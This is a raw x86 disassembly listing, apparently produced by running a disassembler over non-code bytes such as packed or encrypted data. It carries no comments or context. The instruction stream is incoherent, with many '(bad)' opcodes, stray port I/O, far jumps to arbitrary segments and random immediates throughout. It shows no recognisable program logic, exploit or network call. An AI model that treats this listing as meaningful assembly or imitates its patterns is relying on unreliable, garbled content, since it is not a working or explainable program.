  4128a5:	outs   dx,DWORD PTR ds:[esi]
  4128a6:	lods   al,BYTE PTR ds:[esi]
  4128a7:	(bad)  
  4128a8:	fdivr  DWORD PTR [edi]
  4128aa:	sbb    DWORD PTR [edx],0x8773fb63
  4128b0:	test   DWORD PTR [ecx-0x6f42a1b2],0x8c47d99e
  4128ba:	jp     0x4128b4
  4128bc:	sbb    eax,0xd4147137
  4128c1:	push   eax
  4128c2:	mov    ah,0x33
  4128c4:	or     ch,cl
  4128c6:	cmp    dl,bh
  4128c8:	std    
  4128c9:	sub    BYTE PTR [edx+0x4460dd44],ah
  4128cf:	push   es
  4128d0:	mov    ah,0xa2
  4128d2:	stos   DWORD PTR es:[edi],eax
  4128d3:	ins    DWORD PTR es:[edi],dx
  4128d4:	sbb    DWORD PTR [edi-0x5b],edi
  4128d7:	cmp    al,0xa
  4128d9:	dec    ebp
  4128da:	sbb    DWORD PTR [ecx-0x6dcdee4],ecx
  4128e0:	retf   
  4128e1:	shr    BYTE PTR [ebp-0x39],1
  4128e4:	and    esi,DWORD PTR [edx+0xa5aef54]
  4128ea:	xchg   ebp,eax
  4128eb:	push   edx
  4128ec:	xor    BYTE PTR [ebp-0x7b3d6771],al
  4128f2:	shr    esp,cl
  4128f4:	rol    BYTE PTR [ebx+eiz*1-0x10],0xbb
  4128f9:	cmp    DWORD PTR [ecx+0x33],esi
  4128fc:	(bad)  
  4128fd:	cmp    ah,BYTE PTR [ecx-0x2e449b14]
  412903:	jo     0x4128ce
  412905:	mov    cl,0xaf
  412907:	addr16 add ch,ch
  41290a:	push   ebp
  41290b:	mov    al,0xc3
  41290d:	xor    BYTE PTR [eax+edx*2-0x19a31556],0x64
  412915:	ins    BYTE PTR es:[edi],dx
  412916:	jno    0x4128c0
  412918:	xchg   esi,eax
  412919:	stos   DWORD PTR es:[edi],eax
  41291a:	jnp    0x412946
  41291c:	push   ss
  41291d:	(bad)  
  41291e:	out    dx,eax
  41291f:	ins    DWORD PTR es:[edi],dx
  412920:	cmp    al,0xaa
  412922:	gs aam 0x56
  412925:	ss icebp 
  412927:	jo     0x41294f
  412929:	sub    BYTE PTR [edi],ah
  41292b:	or     al,BYTE PTR [eax]
  41292d:	xchg   ebx,eax
  41292e:	test   BYTE PTR [esp+ebp*1],dl
  412931:	loop   0x412956
  412933:	mov    esp,0x677e7db1
  412938:	int3   
  412939:	nop
  41293a:	inc    esi
  41293b:	jmp    0x9efb307f
  412940:	shl    BYTE PTR [edi+0x71d89db4],1
  412946:	inc    esi
  412947:	jg     0x412927
  412949:	rol    BYTE PTR [edi+esi*1+0x7a],cl
  41294d:	pop    ss
  41294e:	xchg   ebp,eax
  41294f:	xlat   BYTE PTR ds:[ebx]
  412950:	add    cl,BYTE PTR ds:0xce512979
  412956:	jecxz  0x4128ed
  412958:	sti    
  412959:	xor    dl,BYTE PTR [edx-0xc]
  41295c:	jmp    0x4129ca
  41295e:	adc    DWORD PTR [ebx-0x7],edx
  412961:	adc    DWORD PTR [esi+eiz*8+0x227de961],esp
  412968:	lods   eax,DWORD PTR ds:[esi]
  412969:	shl    BYTE PTR [eax],cl
  41296b:	xchg   ecx,eax
  41296c:	xor    cl,BYTE PTR [esi+0x213a616f]
  412972:	jb     0x412993
  412974:	std    
  412975:	(bad)  
  412976:	test   al,0xce
  412978:	fistp  QWORD PTR [edx+0x19c5eee5]
  41297e:	out    0xfa,al
  412980:	add    BYTE PTR [edi+0x38],bl
  412983:	retf   0x8b80
  412986:	mov    dh,0x7a
  412988:	inc    ebx
  412989:	lahf   
  41298a:	adc    ecx,DWORD PTR [eax+0x34]
  41298d:	(bad)  
  41298e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41298f:	jmp    0x412972
  412991:	jmp    0xd869:0x6b07033e
  412998:	sub    cl,ch
  41299a:	and    ah,bh
  41299c:	mov    ecx,0xfc8f8d9
  4129a1:	je     0x41295f
  4129a3:	mov    edx,0xb90772e0
  4129a8:	lods   al,BYTE PTR ds:[esi]
  4129a9:	xchg   esp,eax
  4129aa:	mov    eax,ds:0xd93d3c9f
  4129af:	push   ecx
  4129b0:	pop    esi
  4129b1:	out    0xe0,al
  4129b3:	xor    eax,0xd9c007c7
  4129b8:	popf   
  4129b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ba:	jne    0x412974
  4129bc:	cmp    ebx,0xffffffb8
  4129bf:	jecxz  0x412a24
  4129c1:	daa    
  4129c2:	mov    dl,cl
  4129c4:	das    
  4129c5:	(bad)  
  4129c6:	jne    0x41296f
  4129c8:	cdq    
  4129c9:	in     eax,dx
  4129ca:	aad    0xd3
  4129cc:	lock cmp al,0x22
  4129cf:	enter  0x8ed4,0x77
  4129d3:	mov    bh,0xd2
  4129d5:	mov    al,0xb0
  4129d7:	(bad)
  4129da:	retf   
  4129db:	in     eax,0x48
  4129dd:	rcr    BYTE PTR [ecx+0x26],1
  4129e0:	lods   eax,DWORD PTR ds:[esi]
  4129e1:	sbb    BYTE PTR [ebp-0x3b],bh
  4129e4:	mov    esi,0x3fe59a5f
  4129e9:	mov    al,ds:0xa3a3aee3
  4129ee:	dec    esp
  4129ef:	retf   0xcd72
  4129f2:	jmp    0xe2f4:0x779348a7
  4129f9:	into   
  4129fa:	xchg   BYTE PTR ds:0x4d1ded5c,ch
  412a00:	(bad)  
  412a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a03:	sub    DWORD PTR [eax-0x54],edx
  412a06:	test   BYTE PTR [esi+0x6a],dh
  412a09:	icebp  
  412a0a:	inc    eax
  412a0b:	adc    al,0x19
  412a0d:	dec    esi
  412a0f:	jne    0x412a36
  412a11:	mov    eax,ds:0x449206cc
  412a16:	mov    esi,0xbb940bac
  412a1b:	aaa    
  412a1c:	adc    eax,edi
  412a1e:	mov    ebp,0xafe07a9
  412a23:	sbb    ecx,DWORD PTR ss:[ecx-0x7b]
  412a27:	jg     0x4129fe
  412a29:	ss repnz xchg edx,eax
  412a2c:	push   esi
  412a2d:	loope  0x412a93
  412a2f:	repnz adc ah,0x46
  412a33:	shr    BYTE PTR [ebp-0x5e5605b4],1
  412a39:	dec    ecx
  412a3b:	mov    bl,0x69
  412a3d:	mov    ds:0xcd3a917f,al
  412a42:	bnd jl 0x412a68
  412a45:	mov    esi,0xcb72cbad
  412a4a:	add    ecx,DWORD PTR [edi]
  412a4c:	mov    dl,0x3d
  412a4f:	aad    0x42
  412a51:	jge    0x412a37
  412a53:	retf   0x41ee
  412a56:	ins    BYTE PTR es:[edi],dx
  412a57:	div    BYTE PTR [edi+0x70]
  412a5a:	and    ebx,0x4ffc7be2
  412a60:	or     ecx,DWORD PTR [eax-0x51e14816]
  412a66:	dec    ebx
  412a67:	and    bl,BYTE PTR [edx]
  412a69:	xchg   ebp,eax
  412a6a:	inc    edx
  412a6b:	mov    ds:0xb4640254,al
  412a70:	adc    eax,0xde46a51c
  412a75:	je     0x412aea
  412a77:	lahf   
  412a78:	or     esi,DWORD PTR [edx-0x2e]
  412a7b:	test   eax,0x35089ac3
  412a80:	sub    DWORD PTR [esi-0x1564e209],esp
  412a86:	add    ebx,DWORD PTR [edx-0x6ecd70e9]
  412a8c:	inc    edi
  412a8d:	mov    ebp,0xbb55d310
  412a92:	sub    al,0xd7
  412a94:	dec    edi
  412a95:	and    bh,dh
  412a97:	mov    WORD PTR [ebp-0xb497fac],ds
  412a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a9e:	call   0x2097df15
  412aa3:	dec    esp
  412aa4:	iret   
  412aa5:	pop    edx
  412aa6:	adc    DWORD PTR [ebx+ecx*1-0x38],edi
  412aaa:	cmc    
  412aab:	mov    ebx,0x3586bb82
  412ab0:	dec    ebx
  412ab1:	sub    DWORD PTR [ecx],ebp
  412ab3:	jmp    0x4921:0x9d182ef8
  412aba:	push   0x7cac464d
  412abf:	leave  
  412ac0:	je     0x412b0b
  412ac2:	or     edi,eax
  412ac4:	shr    WORD PTR [edi+0x2146c4c],0x1a
  412acc:	push   esp
  412acd:	sbb    dh,BYTE PTR [ebx+0x5bcf84be]
  412ad3:	imul   edi,edi,0x9ff23a7d
  412ad9:	adc    BYTE PTR [edx-0x28ecc4a3],al
  412adf:	sbb    eax,0xf2c915ea
  412ae4:	mov    ebp,0x6c58595e
  412ae9:	out    0x94,eax
  412aeb:	fisttp QWORD PTR ds:0x431deae8
  412af1:	(bad)  
  412af2:	iret   
  412af3:	adc    al,0x87
  412af5:	sti    
  412af6:	aad    0x9d
  412af8:	int    0xe8
  412afa:	aad    0x1c
  412afc:	pusha  
  412afd:	sub    bh,BYTE PTR [ebp+0x1440e08a]
  412b03:	xchg   DWORD PTR [edi-0x1a],esp
  412b06:	hlt    
  412b07:	sti    
  412b08:	imul   DWORD PTR [ebp-0x12]
  412b0b:	pop    ss
  412b0c:	rol    edi,cl
  412b0e:	scas   eax,DWORD PTR es:[edi]
  412b0f:	daa    
  412b10:	je     0x412acc
  412b12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b13:	lods   eax,DWORD PTR ds:[esi]
  412b14:	push   ecx
  412b15:	adc    esp,ebp
  412b17:	(bad)  
  412b18:	push   esp
  412b19:	test   al,0xb2
  412b1b:	and    DWORD PTR [ebp+esi*1-0x6a0f728a],ecx
  412b22:	cwde   
  412b23:	mov    esp,0xcc5d2abb
  412b28:	lods   eax,DWORD PTR ds:[esi]
  412b29:	cwde   
  412b2a:	mov    al,ds:0x446fb6c7
  412b2f:	mov    gs,WORD PTR [esi+0x2e7e2ced]
  412b35:	rcl    DWORD PTR [edx],0x76
  412b38:	rcr    DWORD PTR [ecx+0x4c833af],cl
  412b3e:	xor    bl,al
  412b40:	sbb    BYTE PTR [edi+0x1f1f9ba4],cl
  412b46:	dec    edi
  412b47:	aas    
  412b48:	adc    al,0xd6
  412b4a:	seto   BYTE PTR [edi-0x767d66d2]
  412b51:	enter  0x2e47,0x2a
  412b55:	das    
  412b56:	jbe    0x412b94
  412b58:	pop    edx
  412b59:	pop    edx
  412b5a:	popf   
  412b5b:	add    al,ch
  412b5d:	stc    
  412b5e:	iret   
  412b5f:	sub    ch,BYTE PTR [ebx+0x5e]
  412b62:	std    
  412b63:	or     dh,BYTE PTR [ebx-0x69]
  412b66:	and    bh,BYTE PTR [esi]
  412b68:	mov    ecx,0x6ad3c0fd
  412b6d:	jmp    0x412b28
  412b6f:	inc    edi
  412b70:	pop    esp
  412b71:	inc    edx
  412b72:	push   0x1975bdff
  412b77:	xchg   esp,eax
  412b78:	xor    al,0xcd
  412b7a:	mov    ah,0x4d
  412b7c:	nop
  412b7d:	retf   0xdfdd
  412b80:	adc    bl,BYTE PTR ds:0x99a4026e
  412b86:	lea    esp,[edi+ebx*4+0x5d]
  412b8a:	sub    al,0x6b
  412b8c:	aas    
  412b8d:	add    DWORD PTR [edx+0x18],edx
  412b90:	adc    bh,BYTE PTR [eax]
  412b92:	xchg   edi,eax
  412b93:	xor    esi,edi
  412b95:	ins    DWORD PTR es:[edi],dx
  412b96:	daa    
  412b97:	mov    bl,BYTE PTR [ecx-0x5c80d749]
  412b9d:	dec    esi
  412b9e:	mov    ebx,0x987b2e9c
  412ba3:	call   0xe337:0x2be2b820
  412baa:	or     edi,edx
  412bac:	popa   
  412bad:	or     dh,bh
  412baf:	jmp    0x1fff69b8
  412bb4:	mov    ecx,0x94c77a1b
  412bb9:	push   edi
  412bba:	and    DWORD PTR [ebp+0x51],edx
  412bbd:	popa   
  412bbe:	jmp    0x412b40
  412bc0:	cld    
  412bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc2:	mov    bl,0xdf
  412bc4:	stos   BYTE PTR es:[edi],al
  412bc5:	pop    ebx
  412bc6:	fdiv   DWORD PTR [ebx-0x6e0da3b9]
  412bcc:	daa    
  412bcd:	xor    al,0xa6
  412bcf:	into   
  412bd0:	adc    DWORD PTR [eax-0x3347e0f6],0xf05d8e5f
  412bda:	popa   
  412bdb:	retf   0xbac9
  412bde:	or     DWORD PTR [edi-0x34759f6e],ebp
  412be4:	ficomp DWORD PTR [edi]
  412be6:	in     eax,0xbf
  412be8:	(bad)  
  412be9:	cld    
  412bea:	enter  0x2452,0x54
  412bee:	push   ds
  412bef:	jnp    0x412c37
  412bf1:	cmp    dl,dh
  412bf3:	fucomp st(6)
  412bf5:	popf   
  412bf6:	sbb    eax,edi
  412bf8:	mov    eax,0x4e387e37
  412bfd:	lahf   
  412bfe:	stos   BYTE PTR es:[edi],al
  412bff:	jg     0x412c1e
  412c01:	xchg   ecx,eax
  412c02:	add    al,0x66
  412c04:	fisub  WORD PTR [eax]
  412c06:	push   esp
  412c07:	inc    edi
  412c08:	and    BYTE PTR [edx-0x17],0x75
  412c0c:	push   ecx
  412c0d:	in     al,dx
  412c0e:	mov    ch,0xba
  412c10:	sbb    DWORD PTR [edi],esp
  412c12:	sub    eax,0x2d07a730
  412c17:	and    BYTE PTR [edi],bh
  412c19:	inc    esi
  412c1a:	ret    0xdd9b
  412c1d:	xor    cl,BYTE PTR [eax-0x66]
  412c20:	hlt    
  412c21:	cmp    eax,0xfbad9def
  412c26:	mov    WORD PTR [edx],ss
  412c28:	pop    edi
  412c29:	fdiv   DWORD PTR [edi-0x29]
  412c2c:	jo     0x412bef
  412c2e:	jmp    0x8a46:0x1a26cbc
  412c35:	jo     0x412c8f
  412c37:	repnz out 0x58,eax
  412c3a:	mov    ds:0xf44901b5,al
  412c3f:	jb     0x412bc6
  412c41:	cdq    
  412c42:	and    BYTE PTR [edi-0x5a4ae25e],al
  412c48:	les    eax,FWORD PTR [edx]
  412c4a:	loop   0x412c1c
  412c4c:	sub    BYTE PTR [eax+0x3f],bl
  412c4f:	mov    bh,0x7
  412c51:	(bad)  
  412c52:	jne    0x412c4b
  412c54:	test   eax,0xda79709d
  412c59:	dec    eax
  412c5a:	mov    eax,0xc1fc66a9
  412c5f:	in     eax,0x52
  412c61:	push   eax
  412c62:	ja     0x412c3d
  412c64:	jb     0x412cb9
  412c66:	cmp    al,0x9a
  412c68:	dec    DWORD PTR [edi]
  412c6a:	das    
  412c6b:	ins    DWORD PTR es:[edi],dx
  412c6c:	jne    0x412ca2
  412c6e:	shr    eax,cl
  412c70:	test   BYTE PTR [eax+edi*2-0x31dbcd5a],ah
  412c77:	mov    al,0x2b
  412c79:	gs sahf 
  412c7b:	ret    
  412c7c:	fisub  DWORD PTR [eax]
  412c7e:	repnz cld 
  412c80:	xlat   BYTE PTR ds:[ebx]
  412c81:	(bad)  
  412c82:	popa   
  412c83:	cwde   
  412c84:	push   edi
  412c85:	popfw  
  412c87:	jae    0x412cf5
  412c89:	(bad)  
  412c8a:	frstor [edi+eiz*4-0x31]
  412c8e:	mov    cl,0xec
  412c90:	test   BYTE PTR [ebx+0x6bfb5304],ch
  412c96:	and    ah,ah
  412c98:	(bad)
  412c9b:	into   
  412c9c:	jp     0x412c72
  412c9e:	jne    0x412cff
  412ca0:	push   0xc3e8a01e
  412ca5:	jnp    0x412cf8
  412ca7:	mov    edx,0x41f298a9
  412cac:	pushf  
  412cad:	dec    edx
  412cae:	ret    
  412caf:	pusha  
  412cb0:	fs xchg ebx,ebx
  412cb3:	loope  0x412ca3
  412cb5:	sbb    al,0xde
  412cb7:	pop    ebp
  412cb8:	aas    
  412cb9:	into   
  412cba:	jb     0x412ccd
  412cbc:	imul   ecx,DWORD PTR [esi+0xca99bad],0xffffffc2
  412cc3:	jae    0x412cfb
  412cc5:	pop    ds
  412cc6:	ror    eax,cl
  412cc8:	sub    ebp,edi
  412cca:	inc    edx
  412ccb:	fcom   DWORD PTR [edi]
  412ccd:	shr    BYTE PTR [esi-0x3ef2135d],0xb9
  412cd4:	lods   eax,DWORD PTR ds:[esi]
  412cd5:	dec    ebx
  412cd6:	xor    dh,ah
  412cd8:	out    0xf8,al
  412cda:	cmp    al,0xad
  412cdc:	mov    ch,0x20
  412cdf:	and    BYTE PTR [edx-0x19fed6ce],0x3b
  412ce6:	call   0x70bc5846
  412ceb:	rol    BYTE PTR [ecx+0x57],1
  412cee:	inc    BYTE PTR [ebx+0x22]
  412cf1:	or     eax,0xade6ce93
  412cf6:	rcr    bl,cl
  412cf8:	xchg   BYTE PTR [ebp+0x342ebe9f],bl
  412cfe:	xor    al,0x6
  412d00:	sbb    eax,0xb1f79a9f
  412d05:	sub    DWORD PTR [esi+0x31],eax
  412d08:	adc    edx,DWORD PTR [ecx+0x67]
  412d0b:	xchg   BYTE PTR [edi+0x7e35a7ea],bl
  412d11:	into   
  412d12:	int    0x1f
  412d14:	cld    
  412d15:	stc    
  412d16:	adc    eax,DWORD PTR [esi+ebx*8]
  412d19:	fist   DWORD PTR es:[eax+eax*1-0x1c]
  412d1e:	mov    ebp,0xd4fe2f03
  412d23:	jae    0x412d1d
  412d25:	push   ds
  412d26:	push   ds
  412d27:	push   ebp
  412d28:	cmp    BYTE PTR [esi-0x1d089e92],al
  412d2e:	imul   eax,DWORD PTR [ecx+0x44],0xc1cb089e
  412d35:	add    al,0x89
  412d37:	repnz sbb eax,0x10b1703d
  412d3d:	shr    BYTE PTR [edi],cl
  412d3f:	sbb    ah,BYTE PTR [ecx]
  412d41:	sub    ebx,DWORD PTR [ebp+0x2fb863ff]
  412d47:	bound  ecx,QWORD PTR [esi-0x9]
  412d4a:	adc    DWORD PTR [ebp-0x8],ebx
  412d4d:	xor    al,BYTE PTR [edx-0x2e]
  412d50:	push   cs
  412d51:	sub    BYTE PTR [edi+0x47],ah
  412d54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d55:	pop    eax
  412d56:	daa    
  412d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d58:	popa   
  412d59:	nop    ecx
  412d5c:	popa   
  412d5d:	mov    ah,0xe3
  412d5f:	(bad)  
  412d61:	in     al,0xf0
  412d63:	enter  0xfa20,0x4b
  412d67:	jle    0x412de0
  412d69:	imul   edx,DWORD PTR [ecx],0xffffffb7
  412d6c:	hlt    
  412d6d:	shl    DWORD PTR [esi],1
  412d6f:	inc    edi
  412d70:	sub    ebp,0xffffff8d
  412d73:	lock or al,0x17
  412d76:	pop    esp
  412d77:	jb     0x412d3e
  412d79:	das    
  412d7a:	stos   BYTE PTR es:[edi],al
  412d7b:	sub    BYTE PTR [ecx-0x67],0xf1
  412d7f:	adc    eax,0x1739d77b
  412d84:	inc    esp
  412d85:	cwde   
  412d86:	rol    dh,1
  412d88:	mov    WORD PTR [eax+0x6c19660e],ds
  412d8e:	xchg   edi,eax
  412d8f:	mov    ebx,0xe87e92aa
  412d94:	pop    esp
  412d95:	lea    ecx,[ebx+0x7c]
  412d98:	mov    edx,DWORD PTR [edx+eiz*1+0x7c]
  412d9c:	push   0xffffffe8
  412d9e:	jnp    0x412e14
  412da0:	mov    al,ds:0x81bbe00a
  412da5:	in     al,dx
  412da6:	xor    BYTE PTR [edi-0x7adfa9bc],cl
  412dac:	fst    QWORD PTR [ecx]
  412dae:	fiadd  DWORD PTR ds:0xf94fff20
  412db4:	cli    
  412db5:	ret    0x703a
  412db8:	pop    ss
  412db9:	dec    esp
  412dba:	mov    bh,0x28
  412dbc:	mov    eax,0xc2769d18
  412dc1:	sub    dh,0xf7
  412dc4:	xchg   ebp,eax
  412dc5:	cmp    eax,0x444ed69b
  412dca:	dec    esp
  412dcb:	push   ds
  412dcc:	sub    BYTE PTR [ebx],bh
  412dce:	ins    DWORD PTR es:[edi],dx
  412dcf:	hlt    
  412dd0:	push   esi
  412dd1:	stos   BYTE PTR es:[edi],al
  412dd2:	stos   DWORD PTR es:[edi],eax
  412dd3:	cs inc ecx
  412dd5:	push   edi
  412dd6:	jg     0x412d93
  412dd8:	lahf   
  412dd9:	dec    eax
  412dda:	imul   ecx,DWORD PTR [esi-0x1],0xcc16ab26
  412de1:	mov    dl,0xa1
  412de3:	inc    edx
  412de4:	pop    ss
  412de5:	xchg   esp,eax
  412de6:	pop    esi
  412de7:	out    dx,eax
  412de8:	sub    BYTE PTR [edi-0x1f3d06a3],0x50
  412def:	ret    
  412df0:	sub    BYTE PTR [esi],0xc6
  412df3:	pop    ss
  412df4:	cmp    BYTE PTR [ebp-0x4df68de1],ch
  412dfa:	add    edi,DWORD PTR [esi]
  412dfc:	jno    0x412e6f
  412dfe:	(bad)
  412e02:	mov    ecx,0x5394692
  412e07:	sub    eax,0xaf020ae
  412e0c:	sub    dl,0x70
  412e0f:	stos   BYTE PTR es:[edi],al
  412e10:	jne    0x412e27
  412e12:	test   eax,0xc84882fb
  412e17:	mov    edx,DWORD PTR [esp+ecx*2-0x6d]
  412e1b:	sbb    ebp,DWORD PTR [edi-0x78]
  412e1e:	and    bh,cl
  412e20:	addr16 clc 
  412e22:	loope  0x412dc3
  412e24:	push   cs
  412e25:	xchg   DWORD PTR [ecx-0x6555d516],edi
  412e2b:	mov    esi,0xfff7c0d1
  412e30:	stc    
  412e31:	ins    BYTE PTR es:[edi],dx
  412e32:	sub    BYTE PTR ds:0xae08d2ce,bh
  412e38:	pop    ds
  412e39:	jp     0x412e66
  412e3b:	(bad)  
  412e3c:	(bad)  
  412e3d:	or     esp,ecx
  412e3f:	sub    al,0xcb
  412e41:	cmp    BYTE PTR [edi+0x26d01e4c],dh
  412e47:	push   ecx
  412e48:	out    dx,al
  412e49:	pop    sp
  412e4b:	nop
  412e4c:	outs   dx,DWORD PTR ds:[esi]
  412e4d:	rol    ebp,0xbd
  412e50:	cld    
  412e51:	cmp    ebp,DWORD PTR [ecx-0x4ad9ea53]
  412e57:	push   0xffffffd7
  412e59:	loop   0x412e7c
  412e5b:	pop    edi
  412e5c:	inc    ebp
  412e5d:	jecxz  0x412eb7
  412e5f:	dec    edx
  412e60:	(bad)  
  412e61:	xor    ah,bl
  412e63:	out    0x92,eax
  412e65:	push   ebp
  412e66:	add    BYTE PTR [ecx+0x5dc1a9b],ch
  412e6c:	cmp    cl,cl
  412e6e:	push   ecx
  412e6f:	sbb    eax,0xed7d0dd8
  412e74:	ror    ecx,1
  412e76:	mov    eax,ds:0x4aa56080
  412e7b:	mov    WORD PTR [esi*8-0x380eabfb],ss
  412e82:	retf   
  412e83:	cmp    ebp,esi
  412e85:	jbe    0x412e34
  412e87:	daa    
  412e88:	lds    esp,FWORD PTR [eax]
  412e8a:	f2xm1  
  412e8c:	mov    ah,0xe3
  412e8e:	loope  0x412e68
  412e90:	or     DWORD PTR [ebx+0x404e4618],esi
  412e96:	scas   eax,DWORD PTR es:[edi]
  412e97:	(bad)  
  412e98:	icebp  
  412e99:	rcl    DWORD PTR [esi-0x6d7e6e24],0xec
  412ea0:	sahf   
  412ea1:	lods   eax,DWORD PTR ds:[esi]
  412ea2:	jns    0x412e62
  412ea4:	stc    
  412ea5:	push   0x4fc47d7d
  412eaa:	ror    dh,0xa
  412ead:	lods   eax,DWORD PTR ds:[esi]
  412eae:	gs cdq 
  412eb0:	push   0xe
  412eb2:	cli    
  412eb3:	mov    BYTE PTR [esi],al
  412eb5:	sahf   
  412eb6:	lods   al,BYTE PTR ds:[esi]
  412eb7:	fwait
  412eb8:	(bad)  
  412eb9:	scas   eax,DWORD PTR es:[edi]
  412eba:	jbe    0x412ec2
  412ebc:	test   eax,0x3e25694d
  412ec1:	imul   eax,DWORD PTR [esi],0xffffff9f
  412ec4:	enter  0x9baf,0x7d
  412ec8:	mov    ah,0x60
  412eca:	lods   al,BYTE PTR ds:[esi]
  412ecb:	mov    ebx,0xc372407d
  412ed0:	pop    ss
  412ed1:	(bad)  
  412ed2:	cs inc edx
  412ed4:	int    0xf0
  412ed6:	inc    ebp
  412ed7:	fisttp DWORD PTR [esi-0x12]
  412eda:	and    BYTE PTR [esi+ecx*8-0x68b62111],bl
  412ee1:	xchg   esp,eax
  412ee2:	cmp    DWORD PTR [edx+0x52],esp
  412ee5:	mov    edx,0x16c94f6
  412eea:	out    dx,al
  412eeb:	outs   dx,DWORD PTR ds:[esi]
  412eec:	(bad)  
  412eed:	shl    eax,cl
  412eef:	es retf 
  412ef1:	push   esi
  412ef2:	fsub   QWORD PTR [eax+0x1593290b]
  412ef8:	mov    ds:0xa3e93895,eax
  412efd:	enter  0xd3b5,0xe2
  412f01:	jp     0x412f7f
  412f03:	repz lock mov dh,0xf9
  412f07:	(bad)  
  412f08:	mov    cl,0x2b
  412f0a:	in     eax,dx
  412f0b:	aad    0xd8
  412f0d:	ins    DWORD PTR es:[edi],dx
  412f0e:	jp     0x412f6e
  412f10:	adc    DWORD PTR [eax],edi
  412f12:	cmp    ecx,DWORD PTR [edx]
  412f14:	jne    0x412f11
  412f16:	xlat   BYTE PTR ds:[ebx]
  412f17:	and    DWORD PTR [esi+0x3a04f022],ebx
  412f1d:	fisttp DWORD PTR [ecx+0x11]
  412f20:	dec    edi
  412f21:	aaa    
  412f22:	es cmp edi,0x433de662
  412f29:	mov    BYTE PTR [ebx+0x14],dh
  412f2c:	add    eax,0xa9488d12
  412f31:	mov    edi,0x363a29ab
  412f36:	cli    
  412f37:	jnp    0x412f3e
  412f39:	add    dh,BYTE PTR [edx-0x2ab1e83b]
  412f3f:	xor    cl,BYTE PTR [edi+0x2af14412]
  412f45:	mov    ebx,0x8ea041
  412f4b:	cmp    al,0x16
  412f4d:	mov    ebx,0xc4462755
  412f52:	mov    ch,0xea
  412f54:	mov    esp,0x9b414a2c
  412f59:	scas   eax,DWORD PTR es:[edi]
  412f5a:	and    BYTE PTR [ebp+edx*8-0x5d],bl
  412f5e:	adc    eax,0xe33cd884
  412f63:	jns    0x412f2d
  412f65:	repnz in eax,dx
  412f67:	fistp  DWORD PTR [ebp-0x45]
  412f6a:	call   0xe460:0xcfc61c0f
  412f71:	ja     0x412fa8
  412f73:	inc    dl
  412f75:	clc    
  412f76:	jg     0x412f24
  412f78:	iret   
  412f79:	rcr    DWORD PTR [esi+0x15d9941d],0xe0
  412f80:	inc    ebp
  412f81:	jg     0x412f60
  412f83:	or     al,0x99
  412f85:	lea    esi,ds:0x2db01ff9
  412f8b:	pop    ecx
  412f8c:	cmc    
  412f8d:	pop    ss
  412f8e:	leave  
  412f8f:	(bad)  
  412f90:	sub    edi,DWORD PTR [eax-0x63]
  412f93:	std    
  412f94:	mov    DWORD PTR [edi],esi
  412f96:	xchg   BYTE PTR [esi+0x6d],dl
  412f99:	cmp    DWORD PTR ss:[edi-0x7c],ebx
  412f9d:	mov    edx,edx
  412f9f:	fist   DWORD PTR [ebx+0x1c]
  412fa2:	stc    
  412fa3:	aam    0xba
  412fa5:	mov    eax,ds:0xe261940
  412faa:	jg     0x412ff4
  412fac:	fcmovu st,st(5)
  412fae:	pushf  
  412faf:	add    BYTE PTR [ebx],ch
  412fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fb2:	sub    al,0xd9
  412fb4:	dec    esp
  412fb5:	mov    ebp,0x7077882
  412fba:	(bad)  
  412fbb:	sti    
  412fbc:	push   ss
  412fbd:	mov    edx,0xacd88a2e
  412fc2:	push   cs
  412fc3:	hlt    
  412fc4:	imul   esp,DWORD PTR [ecx],0xf
  412fc7:	adc    DWORD PTR [edx],0xd3e7f588
  412fcd:	jp     0x413006
  412fcf:	bt     DWORD PTR [ebx-0x16],eax
  412fd3:	and    eax,0x5e1c4bfc
  412fd8:	mov    ?,WORD PTR [ebx]
  412fda:	mov    esp,0x3696fadc
  412fdf:	jmp    0xf571:0xa90ba5b4
  412fe6:	iret   
  412fe7:	inc    ecx
  412fe8:	or     ecx,ebx
  412fea:	pop    DWORD PTR [eax]
  412fec:	jo     0x412f82
  412fee:	jo     0x41302d
  412ff0:	shl    ebp,0xeb
  412ff3:	mov    ebx,0xa4d4c5b
  412ff8:	repnz outs dx,DWORD PTR ds:[esi]
  412ffa:	dec    edi
  412ffb:	daa    
  412ffc:	and    DWORD PTR [edx+0x23a57c70],0x5c
  413003:	mov    cl,0x64
  413005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413006:	or     bl,BYTE PTR [eax-0xe]
  413009:	xor    al,0xa0
  41300b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41300c:	popa   
  41300d:	inc    esp
  41300e:	sti    
  41300f:	jecxz  0x412fdf
  413011:	ins    BYTE PTR es:[edi],dx
  413012:	push   ebx
  413013:	ds (bad) 
  413015:	clc    
  413016:	adc    DWORD PTR [ecx],edx
  413018:	jo     0x41304d
  41301a:	push   cs
  41301b:	sub    DWORD PTR [esi+0x6d],edi
  41301e:	call   0x82d38165
  413023:	dec    ebp
  413024:	push   ebp
  413025:	into   
  413026:	fwait
  413027:	push   cs
  413028:	jle    0x413030
  41302a:	push   esp
  41302b:	shl    DWORD PTR [eax-0x7285a7ad],0x6a
  413032:	out    dx,al
  413033:	retf   
  413034:	jl     0x412fb6
  413036:	ss jb  0x413040
  413039:	data16 cld 
  41303b:	push   ebx
  41303c:	inc    ecx
  41303d:	ds and eax,0xd1de8cc
  413043:	addr16 das 
  413045:	inc    edx
  413046:	adc    BYTE PTR [ecx+ecx*8+0x27],0xcc
  41304b:	jge    0x412fff
  41304d:	sub    edi,esp
  41304f:	ins    BYTE PTR es:[edi],dx
  413050:	lock mov al,0xca
  413053:	ds not edi
  413056:	hlt    
  413057:	dec    edi
  413058:	test   ebp,esi
  41305a:	mov    ah,0x3d
  41305c:	mov    dh,0xcd
  41305e:	push   ss
  41305f:	mov    dh,0x51
  413061:	jmp    0x6926da67
  413066:	inc    ecx
  413067:	shr    DWORD PTR [ebx-0x48],cl
  41306a:	hlt    
  41306b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41306c:	outs   dx,BYTE PTR ds:[esi]
  41306d:	(bad)  
